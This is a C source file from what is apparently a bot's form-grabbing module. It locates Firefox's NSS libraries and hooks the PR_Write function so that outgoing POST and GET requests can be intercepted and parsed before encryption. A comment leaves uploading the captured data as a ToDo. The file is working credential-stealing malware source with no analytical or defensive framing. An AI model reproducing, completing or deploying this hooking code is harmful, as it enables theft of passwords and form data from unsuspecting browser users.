#include "nss3.h"

#ifdef MODULE_FORMGRABBER

#include "..\common\mem.h"
#include "..\common\string.h"
#include "..\common\hooking.h"

#include "formgrabber.h"
#include "httpgrabber.h"

#include "zlib/zlib.h"
#pragma comment(lib, "zlib/zlib.lib")

#include <MSTcpIP.h>

pt_PRWrite oPR_Write;

extern bot_t bot;

__int32 __cdecl PR_Write_Callback(void* fd, const void* buffer, __int32 amount)
{
	char* pszBuffer;
	nss3_request_t request;
	int iRet, iNewLen;

	if((pszBuffer = ToStringA(buffer, amount)) != 0)
	{
		if(StrCompareStartA(pszBuffer, "POST /") || StrCompareStartA(pszBuffer, "GET /"))
		{
			if(ParseNss3RequestFromBuffer(&request, pszBuffer))
			{
				
			}
			/*
				ToDo:
				- Upload report
			*/
		}
	/*	else
		{
			iNewLen = amount;
			//Maybe is compressed
			memzero(pszBuffer, amount);
			iRet = uncompress(pszBuffer, &iNewLen, buffer, amount);
			
			if(iRet == Z_OK)
			{
				pszBuffer[iNewLen] = 0;

				if(StrCompareStartA(pszBuffer, "POST /"))
				{
					if(ParseNss3RequestFromBuffer(&request, pszBuffer))
					{
						CWA(Sleep)(100);
					}
				}
			}
		}*/

		memfree(pszBuffer);
	}

	return oPR_Write(fd, buffer, amount);
}

BOOL WINAPI IsNss3(HMODULE * phMod)
{
	HMODULE hMod;
	unsigned int i;

	LPWSTR module_names[] =
	{
		L"nspr4.dll",
		L"nss3.dll"
	};

	hMod = 0;

	for (i = 0; i < 2; i++)
	{
		if (module_names[i] == NULL) continue;

		if ((hMod = bot.api.pGetModuleHandleW(module_names[i])) != 0)
		{
			*phMod = hMod;
			return TRUE;
		}
	}

	return FALSE;
}

BOOL WINAPI InstallNss3Hooks()
{
	HMODULE hMod;
	unsigned int i;
	LPVOID lpFunctionAddress;
	DWORD dwLength;

	formgrabber_hook_t hooks[] = 
	{
		{"PR_Write", &PR_Write_Callback, (LPVOID*)&oPR_Write}
	};

	hMod = 0;
	lpFunctionAddress = 0;

	if (!IsNss3(&hMod))
		return FALSE;

	for (i = 0; i < sizeof(hooks) / sizeof(formgrabber_hook_t); i++)
	{
		if ((lpFunctionAddress = CWA(GetProcAddress)(hMod, hooks[i].pszFunctionName)) != 0)
		{
			/*if((*hooks[i].lppOriginal = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) != 0)
			{
				if (!HookFunction(lpFunctionAddress, hooks[i].lpCallback, *hooks[i].lppOriginal, &dwLength))
					return FALSE;
			}*/

			*hooks[i].lppOriginal = HookRemoteFunctionEx(CURRENT_PROCESS, lpFunctionAddress, hooks[i].lpCallback, &dwLength);
		}
	}

	return TRUE;
}
#endif